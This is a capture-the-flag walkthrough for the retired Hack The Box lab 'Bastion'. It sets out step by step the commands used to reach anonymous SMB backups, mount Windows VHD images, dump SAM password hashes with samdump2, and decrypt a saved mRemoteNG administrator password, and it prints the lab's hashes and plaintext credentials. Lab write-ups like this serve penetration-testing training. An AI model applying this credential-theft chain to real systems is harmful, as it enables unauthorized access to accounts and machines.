@@ -1,0 +1,123 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box Challenge: Bastion Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-bastion-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-24T17:05:25+00:00">September 24, 2019</time><time class="updated" datetime="2025-06-27T12:34:54+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge called “Bastion” which is categorized as a retired lab developed by Hack the Box for the purpose of online penetration practices. Solving this lab is not that tough if have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.</span></p>
+<p><strong><span style="color: #000000;">Level: Intermediate</span></strong></p>
+<p><span style="color: #000000;">Task: find user.txt and root.txt file on the victim’s machine.</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Open Port &amp; Services (Nmap)</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Connecting to SMB</span></li>
+<li><span style="color: #000000;">Enumerating SMB</span></li>
+<li><span style="color: #000000;">Mounting Backups</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Getting SAM file</span></li>
+<li><span style="color: #000000;">Cracking SAM file contents</span></li>
+<li><span style="color: #000000;">Getting User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating mRemoteNG</span></li>
+<li><span style="color: #000000;">Cracking mRemoteNG encrypted password</span></li>
+<li><span style="color: #000000;">Capture Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">Since these labs are online, therefore they have static IP. The IP of Baiston is 10.10.10.134 so let’s start with nmap port enumeration.</span></p>
+<p><span style="color: #000000;">From the given image below, we can observe that we found ports 22, 135, 139, 445 are open. This means the services like ssh, MSRP, smb etc are running in the victim’s network.</span></p>
+<pre class="lang:default decode:true ">nmap -A 10.10.10.134</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-Voz98jKXOhs/XYpD4TBdZaI/AAAAAAAAgq4/7QMxcMa-EAs2_TtKJrsiqsNGP0ieYaBkgCLcBGAsYHQ/s1600/1.png"/></h3>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">As we can clearly note form the nmap scan that we have the SMB service running, and we don’t have any credentials for the ssh so we went directly on SMB. We logged in using the command mentioned. There is a list of shared directories. We tried a bunch of them but only Backups seems to be accessible. We enumerated that directory. We find a notes.txt, a temp file, and a directory named WindowsImageBackup. Let’s transfer the notes.txt file on our machine to read its contents.</span></p>
+<pre class="lang:default decode:true">smbclient -L //10.10.10.134
+smbclient //10.10.10.134/Backups
+smb: \&gt; ls
+smb: \&gt; get note.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Qu_u49yghqs/XYpD6EGt2_I/AAAAAAAAgrQ/_n6vsuaehKcQVIPi1sEseDRRn_zfss-yQCLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">After transferring the file, we went back on our kali shell and read the file using the cat command.</span></p>
+<pre class="lang:default decode:true">cat note.txt</pre>
+<p><span style="color: #000000;">It contained the message that might be a hint. Let’s keep it in mind and enumerate further.</span></p>
+<p><span style="color: #000000;">“Sysadmins: please don’t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.”</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--Nu9I4hwHAg/XYpD6mWqYUI/AAAAAAAAgrU/lJ4p36-km5gfQRp_hTTcZJ5ltm51ME1aQCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">We went back to the smb, in order to look at the directory we found earlier. It contained another directory with the name of the system, L4mpje, we went into that directory as well to find a Backup directory. Here we found some vhd images. On close inspection, we found that these are system backup files.</span></p>
+<pre class="lang:default decode:true">smbclient //10.10.10.134/Backups
+smb: \&gt; cd WindowslmageBackup
+smb: \WindowslmageBackup\&gt; ls
+smb: \WindowslmageBackup\&gt; cd L4mpje-PC
+smb: WindowsImageBackup\L4mpje-PC\&gt; ls
+smb: \WindowslmageBackup\L4mpje-PC\&gt; cd "Backup 2019-02-22 124351"
+smb: \WindowslmageBackup\L4mpje-PC\Backup 2019-02-22 124351\&gt; ls</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-gBnk6Wv_h-g/XYpD67eMXrI/AAAAAAAAgrY/HcPnzJXFzIEQk7n5PW8iipacYTOBRE50QCLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">The note said that trying to download them will take a very long time, we decided that mounting them is the way to go. To do this we are going to create these directories as shown in the image.</span></p>
+<pre class="lang:default decode:true">mkdir /mnt/L4mpje-PC
+mkdir /mnt/vhd</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-kq3EAkER9Gc/XYpD7Kn3yJI/AAAAAAAAgrc/MvEtK58Q6j0zRC1VndRTMlY6h9aoV4LhACLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">Now for the mounting of those backups, we are going to use the CIFS protocol followed by the path of the backup folder, with an anonymous user.</span></p>
+<pre class="lang:default decode:true">mount -t cifs //10.10.10.134/Backups/WindowsImageBackup/L4mpje-PC /mnt/L4mpje-PC/ -o user=anonymous</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-H3DsA_eFN8w/XYpD7RrxvNI/AAAAAAAAgrg/GEQfj0MzRXU-TPJyZz2ghYLe41rVaEHvgCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">Now using the qemu-nbd we will mount the specific vhd backup file. After mounting we went into the vhd directory to see the files that the backup contained.</span></p>
+<pre class="lang:default decode:true">qemu-nbd -r -c /dev/nbd0 "/mnt/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-al7c-806e6f6e6963.vhd"
+mount -r /dev/nbdOpl /mnt/vhd
+cd /mnt/vhd
+ls -la</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-V_g-EX4YVso/XYpD7758M9I/AAAAAAAAgrk/nWcAjsCqVZ0fkhO5ZZtwOJW3Qv4Oz9sJgCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">We enumerated around for a while and finally, we went into the System32 directory to find a config directory. Here we found the SAM and the SYSTEM file.</span></p>
+<pre class="lang:default decode:true">cd Windows/System32/config
+ls -la</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-BnF629_Pqj8/XYpD8JFQNgI/AAAAAAAAgro/fwO3wloguMgOIE1GG9URWUT400BBGcrWgCLcBGAsYHQ/s1600/8.png"/></h3>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Now we have to extract the credentials from these two files. To do that we are going to use samdump script. After running, we got the following hashes. Two of these users are disabled.</span></p>
+<pre class="lang:default decode:true">samdump2 ./SYSTEM ./SAM</pre>
+<p><strong><span style="color: #000000;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfeed16ae931b73c59d7e0c089c0::: </span></strong></p>
+<p><strong><span style="color: #000000;">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfeed16ae931b73c59d7e0c089c0::: </span></strong></p>
+<p><strong><span style="color: #000000;">L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</span></strong></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-I1LtJozQwoI/XYpD8n-3WZI/AAAAAAAAgrs/iveADPk3EGUZuX18Oep7Zs5NmYPYrUcbwCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">We cracked the hash online to find the password for the user L4mpje to be bureaulampje.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-eMb_ZzJkyvs/XYpD4fEwtaI/AAAAAAAAgrA/QHpQnq1z0ZsJGafp8WZ4EiKzG74DeunPgCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">Now we will login into the lab using the ssh while using the username l4mpje and the password bureaulampje. After logging in we traversed to the Desktop of the user to read the user.txt flag</span></p>
+<pre class="lang:default decode:true">ssh l4mpje@10.10.10.134
+l4mpje@BASTION C:\Users\L4mpje&gt;cd Desktop
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;dir
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;type user.txt</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-rg81Yg3RCuc/XYpD4Q1k_0I/AAAAAAAAgq8/ACuZl12ddTIO1ATFvXKsE76TXG48leP6wCLcBGAsYHQ/s1600/11.png"/></h3>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Now it’s time to escalate privileges on the lab. We enumerated the user directory to look into the AppData directory. Here inside the Roaming directory, we saw that mRemoteNG is installed on the machine. We got some XML files inside it. We tried to open them using the type command to find an encoded password.  </span></p>
+<p><strong><span style="color: #000000;">Password: aEWNFV5uGcjUHFOuS17QTdT9kVqtKCPeoCONw5dmaPFjNO2kt/z05xDgE4HdVmHAowVRdC7emf7lWWAlOdOKiw==</span></strong></p>
+<pre class="lang:default decode:true">l4mpje@BASTION C:\Users\L4mpje&gt;cd AppData\Roaming\mRemoteNG
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG&gt;dir
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG&gt;type confCons.xml</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ri-zaLReTjo/XYpD5dhyHCI/AAAAAAAAgrI/M4cP3yX_OEwAKXzMb19Ri4tyNqA3VD-RwCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">Now, we headed to Google to find any way to decrypt this encoded text, we found this mRemoteNG-Decrypt script for decrypting our password. We cloned the git to our system and ran the python script with the encoded text as a parameter. The password came out to be:</span></p>
+<p><strong><span style="color: #000000;">Password: thXLHM96BeKLOER2</span></strong></p>
+<pre class="lang:default decode:true">git clone https://github.com/haseebT/mRemoteNG-Decrypt.git
+cd mRemoteNG-Decrypt/
+python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHFOuS17QTdT9kVqtKCPeoCONw5dmaPFjNO2kt/z05xDgE4HdVmHAowVRdC7emf7lWWAlOdOKiw==</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3E8N094j42k/XYpD5XWkVfI/AAAAAAAAgrE/Ce1h9EmIBw4LP4sucictcB_C5jZh4LMjgCLcBGAsYHQ/s1600/13.png"/></p>
+<p><span style="color: #000000;">Now we will get the ssh as administrator user with our decoded password.</span></p>
+<pre class="lang:default decode:true">ssh administrator@10.10.10.134</pre>
+<p><span style="color: #000000;">Now let’s enumerate the final flag. We found the root flag on the Desktop.</span></p>
+<pre class="lang:default decode:true">administrator@BASTION C:\Users\Administrator&gt;cd Desktop
+administrator@BASTION C:\Users\Administrator\Desktop&gt;dir 
+administrator@BASTION C:\Users\Administrator\Desktop&gt;type root.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RYAGPKkL3B4/XYpD5pygf5I/AAAAAAAAgrM/lScuW7gWT5wBOYWpktN5zubHisRcZRhlgCLcBGAsYHQ/s1600/14.png"/></p>
+<p><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
